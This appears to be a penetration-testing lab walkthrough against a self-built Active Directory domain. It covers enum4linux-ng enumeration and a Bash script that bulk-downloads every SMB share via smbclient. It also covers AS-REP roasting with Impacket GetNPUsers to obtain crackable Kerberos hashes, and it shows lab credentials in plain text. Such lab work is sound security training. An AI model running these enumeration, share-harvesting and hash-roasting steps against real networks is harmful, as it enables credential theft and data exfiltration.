# Mapping attack vectors

# Use enum4linux to get all enumeration modules: users, groups, shares, policies, sessions, OS info, etc.
enum4linux-ng 192.168.56.2 -u franky.lanie -p 'Password123' -w offensive.local -A > /tmp/enum_output.txt # save the output to enum_output.txt

# Create a Bash script (smb_enum_download.sh) to automatically to download all shared files from SYSVOL and NETLOGON

#!/bin/bash
SERVER="192.168.56.2"
DOMAIN="offensive.local"
USERNAME="franky.lanie"
PASSWORD="Password123"
OUTPUT_DIR="./smb_downloads"
mkdir -p "$OUTPUT_DIR"

# Function to recursively download files using smbclient
download_share() {
    SHARE=$1
    echo "[*] Connecting to share: $SHARE"

    smbclient "//$SERVER/$SHARE" "$PASSWORD" -U "$DOMAIN\\$USERNAME" -c "
        recurse ON;
        prompt OFF;
        lcd \"$OUTPUT_DIR/$SHARE\";
        mkdir \"$OUTPUT_DIR/$SHARE\";
        cd \\;
        mget *"
}
# Get list of shares
SHARES=$(smbclient -L "//$SERVER" -U "$DOMAIN\\$USERNAME%$PASSWORD" 2>/dev/null | awk '/Disk/ {print $1}' | grep -vE 'ADMIN\$|C\$|IPC\$')

for share in $SHARES; do
    mkdir -p "$OUTPUT_DIR/$share"
    download_share "$share"
done

# Run the Bash script 
chmod +x smb_enum_download.sh                                                                                 
./smb_enum_download.sh



###############################################################################################################################################################################################################

# AS-REP roasting

# Prerequisite: At least one domain user has the “Do not require Kerberos preauthentication” flag enabled. 
# In our case, we configured the user bessy.bambie manually in ADUC (Active Directory Users and Computers).

# 1. Create a user list based on earlier enumeration (e.g., via enum4linux or crackmapexec).
echo "bessy.bambie" > users.txt

# 2. Use Impacket's GetNPUsers.py to request AS-REP hashes from the domain controller. 
# This works without authentication for users who have pre-auth disabled.

impacket-GetNPUsers offensive.local/ -dc-ip 192.168.56.2 -no-pass -usersfile users.txt

# 3. If the user is vulnerable, the tool returns an AS-REP hash (format: $krb5asrep$...)
# Copy the full hash output into a file for cracking.

echo '$krb5asrep$23$bessy.bambie@OFFENSIVE.LOCAL:...' > asrep_hashes.txt

# 4. Crack the AS-REP hash offline using John the Ripper ...

###############################################################################################################################################################################################################
